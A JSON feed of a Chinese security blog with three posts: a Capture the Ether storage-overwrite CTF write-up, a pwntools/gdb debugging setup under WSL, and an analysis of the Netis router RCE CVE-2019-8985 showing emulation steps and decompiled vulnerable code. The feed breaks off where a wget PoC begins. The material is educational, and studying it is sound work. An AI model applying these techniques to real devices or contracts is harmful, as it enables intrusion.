{
    "version": "https://jsonfeed.org/version/1",
    "title": "Squirre17 Blog",
    "description": "中年矮臭挫油腻二刺猿死肥宅男什么都不会什么都做不来的废物",
    "home_page_url": "https://Squirre17.github.io",
    "items": [
        {
            "id": "https://squirre17.github.io/2022/08/27/BlockChain-from-scratch-mapping/",
            "url": "https://squirre17.github.io/2022/08/27/BlockChain-from-scratch-mapping/",
            "title": "BlockChain-from-scratch-mapping",
            "date_published": "2022-08-27T08:51:10.000Z",
            "content_html": "<p><a href=\"https://capturetheether.com/challenges/math/mapping/\">Capture the Ether - Mapping</a><br>\n 从一道赛题入门 blockchain</p>\n<h2 id=\"evm存储简介\"><a class=\"markdownIt-Anchor\" href=\"#evm存储简介\">#</a> EVM 存储简介</h2>\n<p>solidity 编译后的数据<br>\n是放在 slot 的结构中<br>\n slot 有 2 ^ 256 个<br>\n每一个有 256 位</p>\n<p>对于 solidity 中的可以在编译期间确定的静态元素<br>\n solc 会将其依次放入内存插槽中（slot）<br>\n<img src=\"/2022/08/27/BlockChain-from-scratch-mapping/1.png\" alt><br>\n这里 bcd 都是 256 位<br>\n所以放在 slot [0…2]<br>\n 但如果是可变长数据结构如果是 array 或者 map<br>\n 值会被放在其他地方 为了性能 这里是直接对当前的 idx 取 keccak<br>\n 比如 <code>keccak(0) = 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563</code> <br>\n 如果 <code>slot[0]</code>  是 array 的话 那么数据就会被放在<br>\n <code>slot[0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563]</code>  里</p>\n<p>注意这里 keccak 是对补齐后的字符串进行 hash 的 而不是对数字<br>\n所以需要 padding 一下</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">padding</span>(<span class=\"params\">x</span>) &#123;</span><br><span class=\"line\">\tx = x.<span class=\"title function_\">toString</span>()</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> s = <span class=\"string\">&quot;0x&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; (<span class=\"number\">64</span> - x.<span class=\"property\">length</span>); i++) &#123;</span><br><span class=\"line\">\t\ts += <span class=\"string\">&quot;0&quot;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\ts += x</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> s</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>solidity 同样存在和 c 一样内存对齐的概念 不再赘述</p>\n<h2 id=\"cte-mapping\"><a class=\"markdownIt-Anchor\" href=\"#cte-mapping\">#</a> cte-mapping</h2>\n<p>首先看合约 map 的 kv 可控</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract MappingChallenge &#123;</span><br><span class=\"line\">    <span class=\"type\">bool</span> public isComplete;</span><br><span class=\"line\">    uint256[] <span class=\"built_in\">map</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">set</span><span class=\"params\">(uint256 key, uint256 value)</span> public &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Expand dynamic array as needed</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">map</span>.length &lt;= key) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">map</span>.length = key + <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">map</span>[key] = value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">get</span><span class=\"params\">(uint256 key)</span> public view <span class=\"title function_\">returns</span> <span class=\"params\">(uint256)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">map</span>[key];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>连接到合约</p>\n<p>set 是可以控制下标 那么给 <code>isComplete</code>  覆盖掉就行了 十分清楚<br>\n map 是可变结构 每个成员是存放在 <code>keccak(padding(1))</code>  依次往上的地方<br>\n可以打印看到</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> ethers = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;ethers&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">const</span> fs = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;fs-extra&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">require</span>(<span class=\"string\">&#x27;dotenv&#x27;</span>).<span class=\"title function_\">config</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"title class_\">Web3</span> = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;web3&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">var</span> web3 =  <span class=\"keyword\">new</span> <span class=\"title class_\">Web3</span>(<span class=\"string\">&quot;your_rpc_url&quot;</span>)</span><br><span class=\"line\">contractAddr = <span class=\"string\">&quot;your_account_addr&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">cl</span> = x =&gt; <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(x)</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">padding</span>(<span class=\"params\">x</span>) &#123;</span><br><span class=\"line\">\tx = x.<span class=\"title function_\">toString</span>()</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> s = <span class=\"string\">&quot;0x&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i %3C (<span class=\"number\">64</span> - x.<span class=\"property\">length</span>); i++) &#123;</span><br><span class=\"line\">\t\ts += <span class=\"string\">&quot;0&quot;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\ts += x</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> s</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">getSlot</span>(<span class=\"params\">idx</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">let</span> ret = <span class=\"keyword\">await</span> web3.<span class=\"property\">eth</span>.<span class=\"title function_\">getStorageAt</span>(contractAddr, idx)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">getShaIdx</span>(<span class=\"params\">idx</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">let</span> ret = <span class=\"keyword\">await</span> web3.<span class=\"property\">utils</span>.<span class=\"title function_\">sha3</span>(<span class=\"title function_\">padding</span>(idx))</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">main</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">\t<span class=\"title function_\">cl</span>(<span class=\"keyword\">await</span> <span class=\"title function_\">getSlot</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">\t<span class=\"title function_\">cl</span>(<span class=\"keyword\">await</span> <span class=\"title function_\">getSlot</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">\t<span class=\"title function_\">cl</span>(<span class=\"keyword\">await</span> <span class=\"title function_\">getShaIdx</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">main</span>()</span><br><span class=\"line\">\t.<span class=\"title function_\">then</span>(<span class=\"function\">() =&gt;</span> process.<span class=\"title function_\">exit</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">\t.<span class=\"title function_\">catch</span>(<span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(err),</span><br><span class=\"line\">\t\tprocess.<span class=\"title function_\">exit</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#125;)&gt;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class=\"line\">0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class=\"line\">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span><br></pre></td></tr></table></figure>\n<p>第三个就是我们 map 第一个元素存放的位置<br>\n用 <code>2**256</code>  减一下就是偏移了</p>\n<p><img src=\"/2022/08/27/BlockChain-from-scratch-mapping/2.png\" alt></p>\n<p><img src=\"/2022/08/27/BlockChain-from-scratch-mapping/3.png\" alt></p>\n",
            "tags": [
                "Blockchain"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/08/16/pwn-in-WSL-Pwsh-and-Vscode/",
            "url": "https://squirre17.github.io/2022/08/16/pwn-in-WSL-Pwsh-and-Vscode/",
            "title": "pwn in WSL Pwsh and Vscode",
            "date_published": "2022-08-16T08:42:50.000Z",
            "content_html": "<h2 id=\"背景提要\"><a class=\"markdownIt-Anchor\" href=\"#背景提要\">#</a> 背景提要</h2>\n<p>回校后来到实验室 借用了下姚佬的 2k 大屏 发现确实舒服 但是有个致命的问题 键盘输入和显示器显示有明显的延迟<br>\n但是在主机就没事<br>\n加上之前也厌烦了在主机和虚拟机之间划来划去 怪麻烦的<br>\n就想有没有可替代的方案 让我不需要进虚拟机（将其当个远程服务器）<br>\n就能舒舒服服的做 pwn 题</p>\n<p>然后发现了<a href=\"https://blog.csome.cc/p/2022CISCN-hn-wp/\"> Csome</a> 师傅的博客 是用 powershell 在 wsl 进行的<br>\n然后我审计了一下 pwntools 的源码<br>\n确实会启动一个 terminal 进程 将我们输入的参数进去执行<br>\n在 window 下启动的进程是 <code>cmd.exe</code>  是挂载在 <code>/mnt</code>  目录下<br>\n但是由于是跨文件系统 打开实在太慢 （window 的程序要访问 linux 进程内部的内存空间 得先从 Linux 切进 window<br>\n 在 window 上打开 <code>cmd.exe</code>  再切回 Linux）</p>\n<p>因此寻找别的替代方案<br>\n正好也是 defcon 时期 无聊刷推的时候看到<a href=\"https://www.youtube.com/watch?v=8QAGLdY6bDw\"> DEF CON LiveCTF 2022 - Day 2 - YouTube</a><br>\n 中间的 winpwn 玩家采取的方法<br>\n其实也就是 pause 等待进程 attach 罢了 不过这个足以解决我的一切问题</p>\n<h2 id=\"pwn脚本中定义个函数\"><a class=\"markdownIt-Anchor\" href=\"#pwn脚本中定义个函数\">#</a> pwn 脚本中定义个函数</h2>\n<p>举例 这里定义了一个 dbg 函数 可以将我们传入的断点和 set 信息统统写入 <code>/tmp/gdbscript</code>  作为 gdb 启动信息<br>\n（pwntools 内部就是这么实现的 依葫芦画瓢<br>\n dft 是预定义的一些信息 比如 <code>set $a=0xdeedbeaf</code>  这些需要每次都写入的就写到 dft 里面去</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&quot;Linux&quot;</span>,arch=<span class=\"string\">&quot;amd64&quot;</span>,log_level=<span class=\"string\">&quot;debug&quot;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./emulator&quot;</span>, env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span>: <span class=\"string\">&quot;./libunicorn.so.1&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span>                    :p.recvline()</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims             :p.recvuntil(delims)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">info    = <span class=\"keyword\">lambda</span> tag, addr          :p.info(<span class=\"string\">&#x27;======&gt;&#x27;</span>+tag + <span class=\"string\">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class=\"built_in\">format</span>(addr))</span><br><span class=\"line\">ir      = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">sc      = <span class=\"keyword\">lambda</span> s, addr            :success(s + <span class=\"string\">&quot; =&gt; &quot;</span> + <span class=\"built_in\">hex</span>(addr))</span><br><span class=\"line\">ps\t\t= <span class=\"keyword\">lambda</span> \t\t\t\t\t:pause()</span><br><span class=\"line\"></span><br><span class=\"line\">dft = [<span class=\"string\">&quot;b *0x1234&quot;</span>, <span class=\"string\">&quot;b *0x7890000&quot;</span>]</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dbg</span>(<span class=\"params\">s=[<span class=\"string\">&quot;&quot;</span>]</span>):</span><br><span class=\"line\">\ta = dft + s</span><br><span class=\"line\">\tf = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;/tmp/gdbscript&quot;</span>, <span class=\"string\">&quot;w&quot;</span>)</span><br><span class=\"line\">\ta = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> x:x + <span class=\"string\">&#x27;\\n&#x27;</span>, a))</span><br><span class=\"line\">\tf.writelines(a)</span><br><span class=\"line\">\tf.close()</span><br><span class=\"line\">\tps()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">\tlibc = ELF(<span class=\"string\">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class=\"line\">\tdbg([<span class=\"string\">&quot;b *0xdeedbeaf&quot;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">\texp()</span><br><span class=\"line\">\tir()</span><br></pre></td></tr></table></figure>\n<h2 id=\"gdb的启动方式\"><a class=\"markdownIt-Anchor\" href=\"#gdb的启动方式\">#</a> gdb 的启动方式</h2>\n<p>执行 py 脚本 pause 挂起后<br>\n由我们的 powershell 去 attach</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb attach $(pidof procname) -x /tmp/gdbscript</span><br></pre></td></tr></table></figure>\n<p>procname 是程序名</p>\n<p>或者更直接点 写个脚本 <code>pgdb</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/sh</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">gdb attach $(pidof procname) -x /tmp/gdbscript</span></span><br><span class=\"line\">if [ $# -ne 1 ];then</span><br><span class=\"line\">\techo &quot;usage : pgdb procname&quot;</span><br><span class=\"line\">\texit 1</span><br><span class=\"line\">fi</span><br><span class=\"line\">pid=`pidof $1`</span><br><span class=\"line\">gdb attach $pid -x /tmp/gdbscript</span><br></pre></td></tr></table></figure>\n<p>只需要 <code>pgdb procname</code>  就能 attach 了</p>\n<h2 id=\"工作流\"><a class=\"markdownIt-Anchor\" href=\"#工作流\">#</a> 工作流</h2>\n<p>vscode 写 exp<br>\nvscode terminal 进行 exp 的执行（最喜欢的 terminal<br>\npowershell 进行 gdb<br>\n<img src=\"/2022/08/16/pwn-in-WSL-Pwsh-and-Vscode/20220816164008.png\" alt=\"Pasted image 20220816164008\"></p>\n",
            "tags": [
                "Tips"
            ]
        },
        {
            "id": "https://squirre17.github.io/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/",
            "url": "https://squirre17.github.io/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/",
            "title": "CVE–2019–8985 Netis WF2411 RCE detail",
            "date_published": "2021-08-10T16:00:00.000Z",
            "content_html": "<h2 id=\"环境搭建\"><a class=\"markdownIt-Anchor\" href=\"#环境搭建\">#</a> 环境搭建</h2>\n<p>固件获取  <a href=\"https://www.netis-systems.com/Suppory/de_details/id/1/de/168.html\">WF2419</a><br>\n<a href=\"https://www.tacnetsol.com/blog/cve-2019-8985-rce\">Fetching Title#sw0w</a><br>\n 选择 WF2419（2.2.36123）</p>\n<p>先逆向分析 <code>boa</code> <br>\n 漏洞点</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">loc_4145D8:              <span class=\"meta\"># s</span></span><br><span class=\"line\">addiu   $a0, $sp, <span class=\"number\">0x60</span>+var_40</span><br><span class=\"line\">li      $a1, <span class=\"number\">0x420000</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">addiu   $a1, (aSS_0 - <span class=\"number\">0x420000</span>)  # <span class=\"string\">&quot;%s:%s&quot;</span></span><br><span class=\"line\">move    $a2, $s0</span><br><span class=\"line\">move    $a3, $s4</span><br><span class=\"line\">la      $t9, <span class=\"built_in\">sprintf</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">jalr    $t9 ; <span class=\"built_in\">sprintf</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">lw      $gp, <span class=\"number\">0x60</span>+var_48($sp)</span><br><span class=\"line\">nop</span><br><span class=\"line\">li      $s3, <span class=\"number\">0x460000</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">addiu   $s3, (byte_4596D0 - <span class=\"number\">0x460000</span>)</span><br><span class=\"line\">lbu     $v0, <span class=\"number\">0x60</span>+var_40($sp)</span><br><span class=\"line\">nop</span><br><span class=\"line\">addiu   $s2, $v0, <span class=\"number\">-0x3A</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">user_ok</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *a1, <span class=\"type\">const</span> <span class=\"type\">char</span> *a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// $s1</span></span><br><span class=\"line\">  <span class=\"type\">int</span> result; <span class=\"comment\">// $v0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v6; <span class=\"comment\">// $s2</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v7; <span class=\"comment\">// $v0</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *v8; <span class=\"comment\">// $s0</span></span><br><span class=\"line\">  <span class=\"type\">bool</span> v9; <span class=\"comment\">// dc</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v10[<span class=\"number\">64</span>]; <span class=\"comment\">// [sp+20h] [-40h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v10, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v10));</span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( get_password(<span class=\"number\">64</span>) &gt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">sprintf</span>(v10, <span class=\"string\">&quot;%s:%s&quot;</span>, a1, a2);</span><br><span class=\"line\">    v6 = (<span class=\"type\">unsigned</span> __int8)v10[<span class=\"number\">0</span>] - <span class=\"number\">58</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v7 = v4 &lt;&lt; <span class=\"number\">6</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( byte_4596D0[<span class=\"number\">64</span> * v4] == <span class=\"number\">58</span> &amp;&amp; !v6 )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      v8 = &amp;byte_4596D0[v7];</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( <span class=\"built_in\">strlen</span>(&amp;byte_4596D0[v7]) &gt;= <span class=\"number\">2</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v9 = <span class=\"built_in\">strcmp</span>(v10, v8) == <span class=\"number\">0</span>;</span><br><span class=\"line\">        result = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v9 )</span><br><span class=\"line\">          <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( ++v4 &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;check password error,log_passwd=%s;passwd=%s\\n&quot;</span>, a2, byte_4596D0);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;%s:%s:%d;get password error!\\n&quot;</span>, <span class=\"string\">&quot;htauth.c&quot;</span>, <span class=\"string\">&quot;user_ok&quot;</span>, <span class=\"number\">74</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>启动 boa 的时候可以检查下配置文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  sqrootfs file bin/busybox         </span><br><span class=\"line\">bin/busybox: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class=\"line\">➜  sqrootfs cp $(which qemu-mips) .</span><br><span class=\"line\">➜  sqrootfs grep -r &quot;boa -&quot; .                   </span><br><span class=\"line\">./bin/webs:\t/bin/boa -p /web -f /etc/boa.conf &amp;</span><br><span class=\"line\">grep: ./var/run/webs.pid: Permission denied</span><br><span class=\"line\">➜  sqrootfs sudo chroot . ./qemu-mips /bin/boa -p /web -f /etc/boa.conf</span><br><span class=\"line\">[sudo] password for squ: </span><br><span class=\"line\">Starting Protocol Module: HTTP Server                      ... OK</span><br></pre></td></tr></table></figure>\n<p>如果出现不能缺失 <code>/dev/null</code>  的问题<br>\n可以 <code>sudo mknod -m 666 dev/null c 1 3</code> <br>\n 如果出现 <code>can't create PID file</code> <br>\n 可以 <code>md var/run</code></p>\n<p>然后可以打个 PoC 试试看</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget 